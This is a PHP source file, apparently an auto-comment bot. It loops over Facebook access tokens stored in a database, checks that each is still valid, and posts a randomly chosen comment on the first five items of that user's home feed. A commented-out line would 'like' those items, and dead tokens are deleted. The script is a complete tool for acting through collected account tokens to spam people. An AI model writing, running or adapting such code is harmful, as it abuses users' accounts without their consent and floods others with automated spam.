<?php
include './connect.php';
include './random.php';

set_time_limit(30);

$text = $r[$rualKey];

$count = rand(1, 100);
$msg = $text.'
';

$sql = 'select * from userComment ORDER BY lastlogin ASC';
$data=$db->query($sql);
foreach ($data as $user) {
global $msg;
$tokens=$user['token'];

$data=auto('https://graph.facebook.com/me/?access_token='.$tokens.'&method=get');
$rual= json_decode($data);
$my = json_decode( json_encode($rual), true);
if(isset($my['id']))
{
$status=json_decode(auto('https://graph.facebook.com/me/home?fields=id&access_token='.$tokens.'&offset=0&limit=5'),true);
$data=$status['data'];
foreach($data as $nr => $s)
{
$id=$s['id'];
// auto('https://graph.facebook.com/'.$id.'/likes?access_token='.$tokens.'&method=post');

auto('https://graph.facebook.com/'.$id.'/comments?access_token='.$tokens.'&message='.urlencode($msg).'&method=post');

}
}
else {
  delete_bot($tokens);
}
}
function auto($url)
{
  $curl = curl_init();
  curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
  curl_setopt($curl , CURLOPT_URL, $url);
  $ch = curl_exec($curl);
  curl_close($curl);
  return $ch;
}

?>
